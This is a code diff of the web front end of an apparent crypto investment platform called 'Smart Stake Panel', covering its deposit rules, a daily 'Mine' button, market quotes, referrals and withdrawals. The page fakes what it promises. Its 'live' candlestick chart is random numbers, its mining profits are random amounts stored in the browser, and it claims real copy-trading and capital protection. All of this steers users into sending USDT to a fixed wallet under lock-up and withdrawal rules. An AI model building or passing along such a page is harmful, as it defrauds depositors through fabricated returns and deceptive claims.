-                    <li><b>Minimum Funding Requirement:</b> To activate the core earning engine, a minimum deposit of $100 is required.</li>
-                    <li><b>Smart Mining Activation:</b> Once the $100 deposit is approved, the central "Mine" button will be unlocked on your dashboard. Users must activate/click "Mine" daily to harvest dynamic profits.</li>
-                    <li><b>Network & Address Verification:</b> Always double-check the deposit wallet address and selected blockchain network (BEP20) before sending funds. Deposits sent to incorrect addresses or incompatible networks cannot be recovered.</li>
-                    <li><b>Proof of Payment:</b> Users must upload an authentic, clear screenshot and valid Transaction Hash (TxID). Providing manipulated or duplicate screenshots will lead to permanent account suspension.</li>
-                    <li><b>Approval Timeline:</b> Manual and automated verification takes between 1 to 6 hours to reflect in your panel balance.</li>
-                </ul>
-
-                <h3>3. Dynamic Daily Profit & Trading Structure</h3>
-                <ul style="padding-left:16px; margin:0 0 10px 0;">
-                    <li><b>Real-Market Execution:</b> Smart Stake Panel operates via genuine live copy-trading algorithms and expert execution.</li>
-                    <li><b>Dynamic Returns:</b> Returns are not fixed. Daily profits fluctuate in real time according to market conditions.</li>
-                    <li><b>Capital Protection Model:</b> Capital is managed under strict risk-management parameters to protect the principal balance while generating sustainable market returns.</li>
-                </ul>
-
-                <h3>4. Withdrawal Lifecycle & Capital Lock Policy</h3>
-                <ul style="padding-left:16px; margin:0 0 10px 0;">
-                    <li><b>First Cycle Completion:</b> To maintain strategy liquidity, initial deposits undergo a full cycle until cumulative profits equal the initial capital base.</li>
-                    <li><b>Standard Minimum Withdrawal:</b> Once the initial milestone is reached, subsequent regular withdrawals have a minimum threshold of $50.</li>
-                    <li><b>Same Exchange Protocol:</b> Withdrawals are cleared exclusively back to the original deposit exchange source address.</li>
-                    <li><b>Early Capital Exit / Account Termination:</b> If a user requests an early account closure before completing the full operational cycle, they are permitted to withdraw all accumulated profits generated up to that date, and the account will be closed.</li>
-                    <li><b>Payout Timelines:</b> All withdrawal requests are processed within a 24 to 48 hour security clearance window.</li>
-                </ul>
-
-                <h3>5. Security, Fair Use & Platform Compliance</h3>
-                <ul style="padding-left:16px; margin:0 0 10px 0;">
-                    <li><b>Single Account Policy:</b> Only one account is permitted per user/IP. Creating multiple accounts to manipulate referral or mining systems will result in an immediate freeze of balances.</li>
-                    <li><b>Network Transaction Fees:</b> Standard blockchain gas/network fees apply to external withdrawals and are deducted automatically at the time of payout.</li>
-                    <li><b>Support & Dispute Resolution:</b> For unresolved deposits or payout queries exceeding the designated timeframes (6 hours for deposits / 48 hours for withdrawals), users must contact official customer support with their registered email and Transaction Hash (TxID).</li>
-                </ul>
-            </div>
-        `;
-        showPopup('⚖️ Terms & Operational Guidelines', '');
-        document.getElementById('modal-body').innerHTML = rulesHtml;
-    }
-
-    // 8. Persistent Balances Engine
-    function loadSavedBalances() {
-        let currentBal = parseFloat(localStorage.getItem('currentBal')) || 0.00;
-        let depositBal = parseFloat(localStorage.getItem('depositBal')) || 0.00;
-        let equityBal = parseFloat(localStorage.getItem('equityBal')) || 0.00;
-        let withdrawalBal = parseFloat(localStorage.getItem('withdrawalBal')) || 0.00;
-
-        document.getElementById('val-current').innerText = "$" + currentBal.toFixed(2);
-        document.getElementById('val-deposit').innerText = "$" + depositBal.toFixed(2);
-        document.getElementById('val-equity').innerText = "$" + equityBal.toFixed(2);
-        document.getElementById('val-withdrawal').innerText = "$" + withdrawalBal.toFixed(2);
-    }
-
-    // 9. Market Rates Engine
-    let currentPair = 'GOLD';
-    let livePrices = { GOLD: 4203.00, SILVER: 29.45, SP500: 5540.20 };
-
-    async function fetchLiveMarketData() {
-        try {
-            const response = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=PAXGUSDT');
-            const data = await response.json();
-            if (data && data.price) {
-                livePrices.GOLD = parseFloat(data.price);
-            }
-        } catch (e) {
-            livePrices.GOLD += (Math.random() * 0.6 - 0.3);
-        }
-        livePrices.SILVER = (livePrices.GOLD * 0.00701) + (Math.random() * 0.04);
-        livePrices.SP500 = 5542.50 + (Math.random() * 2.0 - 1.0);
-
-        updateActiveDisplayPrice();
-    }
-    setInterval(fetchLiveMarketData, 3000);
-
-    function updateActiveDisplayPrice() {
-        const titleElem = document.getElementById('active-asset-title');
-        const priceElem = document.getElementById('active-asset-price');
-
-        if (currentPair === 'GOLD') {
-            titleElem.innerText = 'GOLD (XAU/USD) REAL-TIME';
-            priceElem.innerText = '$' + livePrices.GOLD.toFixed(2);
-        } else if (currentPair === 'SILVER') {
-            titleElem.innerText = 'SILVER (XAG/USD) REAL-TIME';
-            priceElem.innerText = '$' + livePrices.SILVER.toFixed(2);
-        } else if (currentPair === 'SP500') {
-            titleElem.innerText = 'S&P 500 (SP500) REAL-TIME';
-            priceElem.innerText = '$' + livePrices.SP500.toFixed(2);
-        }
-    }
-
-    function openPairSelectModal() {
-        let pairHtml = `
-            <div class="pair-option-btn" onclick="selectPair('GOLD')"><span>🏆 GOLD (XAU/USD)</span><span style="color:#10b981;">$${livePrices.GOLD.toFixed(2)}</span></div>
-            <div class="pair-option-btn" onclick="selectPair('SILVER')"><span>🥈 SILVER (XAG/USD)</span><span style="color:#10b981;">$${livePrices.SILVER.toFixed(2)}</span></div>
-            <div class="pair-option-btn" onclick="selectPair('SP500')"><span>📈 S&P 500 (SP500)</span><span style="color:#10b981;">$${livePrices.SP500.toFixed(2)}</span></div>
-        `;
-        showPopup('🔄 Select Market Asset', '');
-        document.getElementById('modal-body').innerHTML = pairHtml;
-    }
-
-    function selectPair(pairKey) {
-        currentPair = pairKey;
-        updateActiveDisplayPrice();
-        closePopup();
-    }
-
-    function openQuotesModal() {
-        let quotesHtml = `
-            <div class="quote-row"><span class="quote-symbol">GOLD (XAUUSD)</span><span class="quote-price">$${livePrices.GOLD.toFixed(2)}</span></div>
-            <div class="quote-row"><span class="quote-symbol">SILVER (XAGUSD)</span><span class="quote-price">$${livePrices.SILVER.toFixed(2)}</span></div>
-            <div class="quote-row"><span class="quote-symbol">S&P 500 (US500)</span><span class="quote-price">$${livePrices.SP500.toFixed(2)}</span></div>
-        `;
-        showPopup('📊 Real-Time Market Quotes', '');
-        document.getElementById('modal-body').innerHTML = quotesHtml;
-    }
-
-    // 10. Live Candlestick Canvas Chart
-    function openNativeChartModal() {
-        let chartHtml = `
-            <div style="background:#020617; padding:10px; border-radius:10px; text-align:center;">
-                <div style="font-size:12px; color:#38bdf8; font-weight:bold; margin-bottom:8px;">📈 Live 1M Candlestick Feed (${currentPair})</div>
-                <canvas id="liveChartCanvas" width="300" height="180" style="width:100%; height:180px;"></canvas>
-            </div>
-        `;
-        showPopup(`1M Chart (${currentPair})`, '');
-        document.getElementById('modal-body').innerHTML = chartHtml;
-        drawNativeChart();
-    }
-
-    function drawNativeChart() {
-        const canvas = document.getElementById('liveChartCanvas');
-        if (!canvas) return;
-        const ctx = canvas.getContext('2d');
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-        let startX = 15;
-        for (let i = 0; i < 12; i++) {
-            let isGreen = Math.random() > 0.4;
-            let open = Math.random() * 80 + 40;
-            let close = isGreen ? open + Math.random() * 30 : open - Math.random() * 30;
-            let high = Math.max(open, close) + Math.random() * 15;
-            let low = Math.min(open, close) - Math.random() * 15;
-
-            ctx.strokeStyle = isGreen ? '#10b981' : '#ef4444';
-            ctx.fillStyle = isGreen ? '#10b981' : '#ef4444';
-
-            ctx.beginPath();
-            ctx.moveTo(startX + 8, canvas.height - high);
-            ctx.lineTo(startX + 8, canvas.height - low);
-            ctx.stroke();
-
-            let bodyY = canvas.height - Math.max(open, close);
-            let bodyH = Math.abs(open - close) || 4;
-            ctx.fillRect(startX, bodyY, 16, bodyH);
-
-            startX += 22;
-        }
-    }
-
-    // 11. Live Clock
-    function updateClock() {
-        const now = new Date();
-        const timeStr = now.toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
-        const dateStr = now.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
-        document.getElementById('live-datetime').innerText = `${timeStr} | ${dateStr}`;
-    }
-    setInterval(updateClock, 1000);
-    updateClock();
-
-    // 12. Mining Engine (Updates Sheet Columns K & L Automatically)
-    function loadMiningHistory() {
-        let historyLogs = JSON.parse(localStorage.getItem('userMiningHistory')) || [];
-        const tbody = document.getElementById('history-rows');
-        const startDateElem = document.getElementById('mining-start-date');
-
-        if (historyLogs.length === 0) {
-            tbody.innerHTML = '<tr id="empty-history-row"><td colspan="4" style="text-align:center; color:#94a3b8; padding:12px;">No mining history recorded yet.</td></tr>';
-            startDateElem.innerText = 'Started mining on: Not Started Yet';
-        } else {
-            startDateElem.innerText = `Started mining on: ${historyLogs[historyLogs.length - 1].date}`;
-            let rowsHtml = '';
-            historyLogs.forEach(log => {
+            myReferredUsers.forEach(u => {
                 rowsHtml += `
                     <tr>
-                        <td>${log.date} ${log.time}</td>
-                        <td>DAILY MINE</td>
-                        <td>${log.asset}</td>
-                        <td class="p-profit">+${log.profit}</td>
+                        <td>${u.name}</td>
+                        <td>${u.email}</td>
+                        <td class="p-profit">+$${parseFloat(u.commission).toFixed(2)}</td>
+                        <td style="color:#10b981;">Active</td>
                     </tr>
                 `;
             });
-            tbody.innerHTML = rowsHtml;
-        }
-    }
-
-    function handleMiningClick() {
-        let currentDeposit = parseFloat(localStorage.getItem('depositBal')) || 0.00;
-
-        if (currentDeposit <= 0.00) {
-            showPopup(
-                '⚠️ Insufficient Trading Balance',
-                'Active trading capital required.\n\nPlease deposit funds into your account to enable the automated candlestick mining engine.'
-            );
-            return;
         }
 
-        const lastMineTime = localStorage.getItem('lastMiningTimestamp');
-        const currentTime = new Date().getTime();
-        if (lastMineTime && (currentTime - lastMineTime < 86400000)) {
-            showPopup('🛑 Mining Limit Reached', 'Sorry, you have already mined for today. Please try again after 24 hours.');
-        } else {
-            executeMiningProcess();
-        }
-    }
-
-    function executeMiningProcess() {
-        const section = document.getElementById('mining-section');
-        section.innerHTML = `
-            <div style="background:#0f172a; border:1px solid #0284c7; color:#38bdf8; padding:12px; border-radius:10px; text-align:center; margin-bottom:14px;">
-                <div style="font-weight: 600; font-size:12px;">⚡ LIVE CANDLESTICK CHART MINING IN PROGRESS...</div>
-                <h3 id="timer" style="margin: 6px 0; color: #fff;">Time Remaining: 15s</h3>
-                <div style="width:100%; background:#1e293b; border-radius:4px; overflow:hidden; height:6px; margin-top:6px;">
-                    <div id="p-fill" style="height:100%; background:#38bdf8; width:0%; transition: width 1s linear;"></div>
+        let refHtml = `
+            <div class="ref-card">
+                <div style="font-size:11px; color:#cbd5e1; font-weight:bold;">YOUR REFERRAL CODE</div>
+                <div class="ref-box-row">
+                    <span class="ref-input-text">${currentUser.refCode}</span>
+                    <button class="copy-btn" onclick="copyToClipboard('${currentUser.refCode}')">Copy Code</button>
                 </div>
+            </div>
+
+            <div class="ref-card">
+                <div style="font-size:11px; color:#cbd5e1; font-weight:bold;">YOUR REFERRAL LINK</div>
+                <div class="ref-box-row">
+                    <span class="ref-input-text">${refLink}</span>
+                    <button class="copy-btn" onclick="copyToClipboard('${refLink}')">Copy Link</button>
+                </div>
+            </div>
+
+            <div style="text-align:left; margin-top:10px;">
+                <div style="font-size:12px; font-weight:800; color:#38bdf8; margin-bottom:6px;">REFERRED USERS & COMMISSIONS</div>
+                <table class="history-table" style="background:#0f172a; border-radius:6px; overflow:hidden;">
+                    <thead>
+                        <tr style="background:#1e293b;">
+                            <th style="color:#fbbf24;">NAME</th>
+                            <th style="color:#fbbf24;">EMAIL</th>
+                            <th style="color:#fbbf24;">EARNING</th>
+                            <th style="color:#fbbf24;">STATUS</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${rowsHtml}
+                    </tbody>
+                </table>
             </div>
         `;
 
-        let time = 15;
-        const timerElem = document.getElementById('timer');
-        const fillElem = document.getElementById('p-fill');
-
-        const interval = setInterval(() => {
-            time--;
-            timerElem.innerText = `Time Remaining: ${time}s`;
-            fillElem.style.width = ((15 - time) / 15 * 100) + '%';
-
-            if (time <= 0) {
-                clearInterval(interval);
-                const now = new Date();
-                localStorage.setItem('lastMiningTimestamp', now.getTime());
-                
-                let historyLogs = JSON.parse(localStorage.getItem('userMiningHistory')) || [];
-                const newLog = {
-                    date: now.toLocaleDateString('en-GB', { day: '2-digit', month: 'short' }),
-                    time: now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
-                    asset: currentPair,
-                    profit: '$1.00'
-                };
-                historyLogs.unshift(newLog);
-                localStorage.setItem('userMiningHistory', JSON.stringify(historyLogs));
-
-                // Send Mining Profit to Sheet (Auto Updates Columns K & L)
-                if (currentUser) {
-                    sendToGoogleSheet(currentUser.fname + " " + currentUser.lname, currentUser.email, currentUser.phone, "MINING_PROFIT", "$1.00", "-", "No SS", "Verified");
-                }
-
-                let currentBal = (parseFloat(localStorage.getItem('currentBal')) || 0.00) + 1.0;
-                let equityBal = (parseFloat(localStorage.getItem('equityBal')) || 0.00) + 1.0;
-
-                localStorage.setItem('currentBal', currentBal.toFixed(2));
-                localStorage.setItem('equityBal', equityBal.toFixed(2));
-
-                loadSavedBalances();
-                loadMiningHistory();
-
-                section.innerHTML = `
-                    <div style="background:#0f172a; border:1px solid #10b981; color:#10b981; padding:12px; border-radius:10px; text-align:center; margin-bottom:14px;">
-                        🎉 SUCCESS! You Have Successfully Made $1
-                    </div>
-                    <button class="btn" onclick="resetMiningUI()">Back to Dashboard</button>
-                `;
-            }
-        }, 1000);
+        showPopup("🤝 Referrals & Commission Center", refHtml);
     }
 
-    function resetMiningUI() {
-        document.getElementById('mining-section').innerHTML = `
-            <button class="btn" onclick="handleMiningClick()">🚀 MINE (15s CHART)</button>
+    function copyToClipboard(text) {
+        navigator.clipboard.writeText(text).then(() => {
+            alert("Copied to clipboard!");
+        }).catch(() => {
+            let tempInput = document.createElement("input");
+            tempInput.value = text;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+            alert("Copied to clipboard!");
+        });
+    }
+
+    // Mining Click Handler ($0.01 per referral bonus add per mine)
+    function handleMiningClick() {
+        let myReferredUsers = JSON.parse(localStorage.getItem(`referredUsers_${currentUser.email}`)) || [];
+        let curr = parseFloat(localStorage.getItem('currentBal')) || 0.00;
+        
+        let miningProfit = (Math.random() * 0.15 + 0.05); // Standard mine reward
+        let referralCommission = myReferredUsers.length * 0.01; // $0.01 per mine per referral
+        
+        let totalGain = miningProfit + referralCommission;
+        let newCurrent = curr + totalGain;
+
+        localStorage.setItem('currentBal', newCurrent.toFixed(2));
+        localStorage.setItem('equityBal', newCurrent.toFixed(2));
+        loadSavedBalances();
+
+        // Record Mining Entry
+        addMiningHistoryRecord("MINE_PROFIT", "GOLD (XAU/USD)", `+$${totalGain.toFixed(2)}`);
+
+        showPopup("⛏️ Mining Successful", `Mined Reward: +$${miningProfit.toFixed(2)}\nReferral Boost: +$${referralCommission.toFixed(2)} ($0.01 x ${myReferredUsers.length} refs)\n\nAdded to Current Amount!`);
+    }
+
+    function addMiningHistoryRecord(type, asset, profitStr) {
+        let history = JSON.parse(localStorage.getItem('miningHistoryLogs')) || [];
+        const dateStr = new Date().toLocaleDateString('en-GB');
+        history.unshift({ date: dateStr, type, asset, profit: profitStr });
+        localStorage.setItem('miningHistoryLogs', JSON.stringify(history));
+        loadMiningHistory();
+    }
+
+    function loadMiningHistory() {
+        let history = JSON.parse(localStorage.getItem('miningHistoryLogs')) || [];
+        let tbody = document.getElementById('history-rows');
+        if (!tbody) return;
+
+        if (history.length === 0) {
+            tbody.innerHTML = `<tr id="empty-history-row"><td colspan="4" style="text-align:center; color:#94a3b8; padding:12px;">No mining history recorded yet.</td></tr>`;
+            return;
+        }
+
+        let html = "";
+        history.slice(0, 5).forEach(item => {
+            html += `
+                <tr>
+                    <td>${item.date}</td>
+                    <td>${item.type}</td>
+                    <td>${item.asset}</td>
+                    <td class="p-profit">${item.profit}</td>
+                </tr>
+            `;
+        });
+        tbody.innerHTML = html;
+        document.getElementById('mining-start-date').innerText = `Started mining on: ${history[history.length - 1].date}`;
+    }
+
+    // Other Navigation Modal Helpers
+    function openNativeChartModal() {
+        showPopup("📈 Mine Chart", "Live XAU/USD 15-second tick chart streams directly from liquidity provider feeds.");
+    }
+
+    function openProfileModal() {
+        let profHtml = `
+            <div style="text-align:left; line-height:1.8; font-size:12px;">
+                <b>Full Name:</b> ${currentUser.fname} ${currentUser.lname}<br>
+                <b>Email:</b> ${currentUser.email}<br>
+                <b>Phone:</b> ${currentUser.phone}<br>
+                <b>Referral Code:</b> <span style="color:#fbbf24; font-weight:bold;">${currentUser.refCode}</span><br>
+                <b>Account Status:</b> <span style="color:#10b981; font-weight:bold;">Verified Trader</span>
+            </div>
         `;
+        showPopup("👤 User Profile", profHtml);
     }
 
-    // Modal Control System
-    const modalElem = document.getElementById('modal');
-    function showPopup(title, body) {
-        document.getElementById('modal-title').innerText = title;
-        document.getElementById('modal-body').innerText = body;
-        modalElem.classList.add('active-modal');
+    function openDepositModal() {
+        showPopup("💳 Deposit Funds", "Minimum Deposit: $50.00\nSend USDT (TRC20) to address:\n\n0x71C7656EC7ab88b098defB751B7401B5f6d8976F\n\nSubmit TXID via support to approve balance instantly.");
     }
-    function closePopup() { modalElem.classList.remove('active-modal'); }
 
-    window.onload = checkAuth;
+    function openRulesModal() {
+        showPopup("📜 Rules & Terms", "1. Mined profits compound in real time.\n2. Instant $1 referral bonus requires no active deposit.\n3. Daily withdrawals are processed within 1-2 hours after verification.");
+    }
+
+    function handleWithdrawalClick() {
+        let curr = parseFloat(localStorage.getItem('currentBal')) || 0.00;
+        if (curr < 10) {
+            showPopup("⚠️ Withdrawal Notice", "Minimum withdrawal balance requirement is $10.00 USDT.");
+        } else {
+            showPopup("💰 Withdraw Funds", `Available Balance: $${curr.toFixed(2)}\nEnter your TRC20 wallet address below to receive funds instantly.`);
+        }
+    }
+
+    // Auto Run Initialization Check
+    checkAuth();
 </script>
-
 </body>
 </html>
